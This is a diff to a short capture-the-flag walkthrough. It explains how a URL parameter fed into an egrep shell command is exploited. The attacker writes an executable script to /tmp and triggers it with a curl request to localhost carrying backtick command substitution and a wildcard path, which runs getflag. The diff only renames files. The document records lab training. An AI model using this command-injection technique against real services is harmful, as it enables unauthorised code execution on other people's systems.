@@ -8,12 +8,12 @@ We also can see it take 2 parameters in URL x and y , and 1st one is passed to 2
 We can so easy inject some code to execute with the "egrep" in shell command 
 but 2 regex modify our string, 1st one transform all char in uppercase, the second one cut all .* so no .sh
 we so can write a script in /tmp with the commande we want executed in lowercase and make it executable so
-	echo "#!/bin/bash" > /tmp/SCRIPT
-	echo "getflag > /tmp/token" >> /tmp/SCRIPT
-	chmod +x /tmp/SCRIPT
+	echo "#!/bin/bash" > /tmp/SCRIPT12
+	echo "getflag > /tmp/token12" >> /tmp/SCRIPT12
+	chmod +x /tmp/SCRIPT12
 
 and then do a curl command to execute the script, let do a wildcard to go in all root paths (/*/)
-	curl localhost:4646?x=\`/*/SCRIPT\`
+	curl localhost:4646?x=\`/*/SCRIPT12\`
 
 And enjoy, the token is printed in /tmp/token12
 	cat /tmp/token12
